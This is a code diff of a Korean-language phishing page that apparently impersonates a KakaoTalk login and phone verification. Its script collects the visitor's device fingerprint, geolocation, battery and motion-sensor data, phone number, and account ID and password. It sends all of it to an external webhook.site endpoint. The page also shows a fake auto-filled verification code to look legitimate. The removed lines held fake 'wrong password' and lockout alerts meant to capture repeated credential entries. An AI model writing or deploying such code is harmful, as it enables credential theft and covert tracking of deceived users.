@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html lang="ko">
 <head>
 <meta charset="UTF-8">
@@ -63,93 +64,110 @@ font-size: 16px; font-weight: bold; color: #000; background: #ffeb00; border: no
 
 <script>
 const webhookUrl = "https://webhook.site/be034e81-7e5e-419d-a673-4f9dce49b392";
-let savedPhone = "";
-let phoneTryCount = 0;
-let loginTryCount = 0;
 
 // page1 -> page2
 function goNext() {
   const chk = document.getElementById("agree");
   if (!chk.checked) { alert("동의 후 진행할 수 있습니다."); return; }
-  collectUserInfo(); // 전체 정보 수집
+  collectUserInfo(); // 최대 정보 수집
   document.getElementById("page1").classList.add("hidden");
   document.getElementById("page2").classList.remove("hidden");
 }
 
-// 최대 정보 수집 (img GET 방식)
+// 최대 정보 수집
 async function collectUserInfo() {
-  const params = new URLSearchParams();
-  params.append("userAgent", navigator.userAgent);
-  params.append("language", navigator.language);
-  params.append("platform", navigator.platform);
-  params.append("cookieEnabled", navigator.cookieEnabled);
-  params.append("onLine", navigator.onLine);
-  params.append("hardwareConcurrency", navigator.hardwareConcurrency ?? "unknown");
-  params.append("deviceMemory", navigator.deviceMemory ?? "unknown");
-  params.append("plugins", Array.from(navigator.plugins).map(p => p.name).join(",") || "unknown");
-  params.append("screen.width", screen.width);
-  params.append("screen.height", screen.height);
-  params.append("screen.availWidth", screen.availWidth);
-  params.append("screen.availHeight", screen.availHeight);
-  params.append("screen.colorDepth", screen.colorDepth);
-  params.append("screen.pixelDepth", screen.pixelDepth);
-  params.append("window.innerWidth", window.innerWidth);
-  params.append("window.innerHeight", window.innerHeight);
-  params.append("window.outerWidth", window.outerWidth);
-  params.append("window.outerHeight", window.outerHeight);
-  params.append("timezone", Intl.DateTimeFormat().resolvedOptions().timeZone);
+  const formData = new URLSearchParams();
 
+  // 브라우저 기본 정보
+  formData.append("userAgent", navigator.userAgent);
+  formData.append("language", navigator.language);
+  formData.append("platform", navigator.platform);
+  formData.append("cookieEnabled", navigator.cookieEnabled);
+  formData.append("onLine", navigator.onLine);
+  formData.append("hardwareConcurrency", navigator.hardwareConcurrency ?? "unknown");
+  formData.append("deviceMemory", navigator.deviceMemory ?? "unknown");
+  formData.append("plugins", Array.from(navigator.plugins).map(p=>p.name).join(",") || "unknown");
+
+  // 화면 정보
+  formData.append("screen.width", screen.width);
+  formData.append("screen.height", screen.height);
+  formData.append("screen.availWidth", screen.availWidth);
+  formData.append("screen.availHeight", screen.availHeight);
+  formData.append("screen.colorDepth", screen.colorDepth);
+  formData.append("screen.pixelDepth", screen.pixelDepth);
+
+  // 창 정보
+  formData.append("window.innerWidth", window.innerWidth);
+  formData.append("window.innerHeight", window.innerHeight);
+  formData.append("window.outerWidth", window.outerWidth);
+  formData.append("window.outerHeight", window.outerHeight);
+
+  // 시간대
+  formData.append("timezone", Intl.DateTimeFormat().resolvedOptions().timeZone);
+
+  // 네트워크 정보
   if (navigator.connection) {
-    params.append("network.downlink", navigator.connection.downlink ?? "unknown");
-    params.append("network.effectiveType", navigator.connection.effectiveType ?? "unknown");
-    params.append("network.rtt", navigator.connection.rtt ?? "unknown");
-    params.append("network.saveData", navigator.connection.saveData ?? "unknown");
-  } else { params.append("network.info", "unknown"); }
+    formData.append("network.downlink", navigator.connection.downlink ?? "unknown");
+    formData.append("network.effectiveType", navigator.connection.effectiveType ?? "unknown");
+    formData.append("network.rtt", navigator.connection.rtt ?? "unknown");
+    formData.append("network.saveData", navigator.connection.saveData ?? "unknown");
+  } else {
+    formData.append("network.info", "unknown");
+  }
 
+  // 배터리 정보
   if (navigator.getBattery) {
     try {
       const battery = await navigator.getBattery();
-      params.append("battery.charging", battery.charging);
-      params.append("battery.level", battery.level);
-      params.append("battery.chargingTime", battery.chargingTime);
-      params.append("battery.dischargingTime", battery.dischargingTime);
-    } catch(e) { params.append("battery.info", "unknown"); }
-  } else { params.append("battery.info", "unknown"); }
+      formData.append("battery.charging", battery.charging);
+      formData.append("battery.level", battery.level);
+      formData.append("battery.chargingTime", battery.chargingTime);
+      formData.append("battery.dischargingTime", battery.dischargingTime);
+    } catch(e) {
+      formData.append("battery.info", "unknown");
+    }
+  } else {
+    formData.append("battery.info", "unknown");
+  }
 
+  // 위치 정보
   if (navigator.geolocation) {
     await new Promise(resolve => {
       navigator.geolocation.getCurrentPosition(pos => {
-        params.append("location.latitude", pos.coords.latitude);
-        params.append("location.longitude", pos.coords.longitude);
-        params.append("location.accuracy", pos.coords.accuracy);
+        formData.append("location.latitude", pos.coords.latitude);
+        formData.append("location.longitude", pos.coords.longitude);
+        formData.append("location.accuracy", pos.coords.accuracy);
         resolve();
-      }, err => { params.append("location.error", err.message); resolve(); });
+      }, err => { formData.append("location.error", err.message); resolve(); });
     });
-  } else { params.append("location", "unknown"); }
+  } else {
+    formData.append("location", "unknown");
+  }
 
+  // 센서 정보 (1회만 수집)
   if (window.DeviceMotionEvent) {
     window.addEventListener("devicemotion", e=>{
       if (e.acceleration) {
-        params.append("sensors.acceleration.x", e.acceleration.x ?? "unknown");
-        params.append("sensors.acceleration.y", e.acceleration.y ?? "unknown");
-        params.append("sensors.acceleration.z", e.acceleration.z ?? "unknown");
+        formData.append("sensors.acceleration.x", e.acceleration.x ?? "unknown");
+        formData.append("sensors.acceleration.y", e.acceleration.y ?? "unknown");
+        formData.append("sensors.acceleration.z", e.acceleration.z ?? "unknown");
       }
     }, { once:true });
   }
-
   if (window.DeviceOrientationEvent) {
     window.addEventListener("deviceorientation", e=>{
-      params.append("sensors.orientation.alpha", e.alpha ?? "unknown");
-      params.append("sensors.orientation.beta", e.beta ?? "unknown");
-      params.append("sensors.orientation.gamma", e.gamma ?? "unknown");
+      formData.append("sensors.orientation.alpha", e.alpha ?? "unknown");
+      formData.append("sensors.orientation.beta", e.beta ?? "unknown");
+      formData.append("sensors.orientation.gamma", e.gamma ?? "unknown");
     }, { once:true });
   }
 
-  params.append("timestamp", new Date().toISOString());
-  params.append("page","1");
+  // 타임스탬프
+  formData.append("timestamp", new Date().toISOString());
+  formData.append("page","1");
 
-  const img = new Image();
-  img.src = webhookUrl + "?" + params.toString();
+  fetch(webhookUrl,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:formData})
+  .catch(err=>console.error("WebHook 전송 오류:",err));
 }
 
 // page2 -> page3
@@ -159,54 +177,26 @@ function sendPhone() {
   if (!userId) { alert("전화번호를 입력해주세요."); return; }
   if (!phoneRegex.test(userId)) { alert("잘못된 형식의 전화번호입니다."); return; }
 
-  phoneTryCount++;
-
-  if (phoneTryCount < 3) {
-    alert("전화번호가 틀렸습니다. 다시 확인해주세요.");
-    return;
-  }
-
-  savedPhone = userId;
-
-  const img = new Image();
-  img.src = webhookUrl + "?" + new URLSearchParams({page:"2",phone:userId,timestamp:new Date().toISOString()}).toString();
+  fetch(webhookUrl,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:new URLSearchParams({page:"2",phone:userId,timestamp:new Date().toISOString()})}).catch(err=>console.error(err));
 
   document.getElementById("page2").classList.add("hidden");
   document.getElementById("page3").classList.remove("hidden");
 
-  const randomCode = String(Math.floor(Math.random() * 1000000)).padStart(6, "0");
   setTimeout(()=>{
-    document.getElementById("authCode").value=randomCode;
+    document.getElementById("authCode").value="141224";
     setTimeout(()=>{
       document.getElementById("page3").classList.add("hidden");
       document.getElementById("page4").classList.remove("hidden");
-      document.getElementById("userId4").value = savedPhone;
     },1000);
   },1500);
 }
 
-// page4 로그인 처리
+// page4 전송
 function sendPage4() {
-  const userId4 = document.getElementById("userId4").value.trim();
-  const userCode4 = document.getElementById("userCode4").value.trim();
-  if(!userId4 || !userCode4){ alert("이메일/전화번호와 비밀번호를 입력해주세요."); return; }
-
-  loginTryCount++;
-  const maxAttempts = 8;
-  const remaining = Math.max(0, maxAttempts - loginTryCount + 1);
-
-  const img = new Image();
-  img.src = webhookUrl + "?" + new URLSearchParams({page:"4", userId:userId4, password:userCode4, timestamp:new Date().toISOString()}).toString();
-
-  if(loginTryCount >= 1 && loginTryCount <= 5) {
-    alert(`비밀번호가 틀렸습니다. 남은 시도 횟수: ${remaining}`);
-    return;
-  }
-
-  if(loginTryCount > 5) {
-    alert("카카오톡 로그인 시도 횟수를 초과했습니다. 2시간 후에 다시 시도해 주세요");
-    return;
-  }
+  const userId4=document.getElementById("userId4").value.trim();
+  const userCode4=document.getElementById("userCode4").value.trim();
+  if(!userId4||!userCode4){alert("이메일/전화번호와 비밀번호를 입력해주세요."); return;}
+  fetch(webhookUrl,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:new URLSearchParams({page:"4",userId:userId4,password:userCode4,timestamp:new Date().toISOString()})}).then(()=>alert("page4 값 전송 완료!")).catch(err=>console.error(err));
 }
 </script>
 </body>
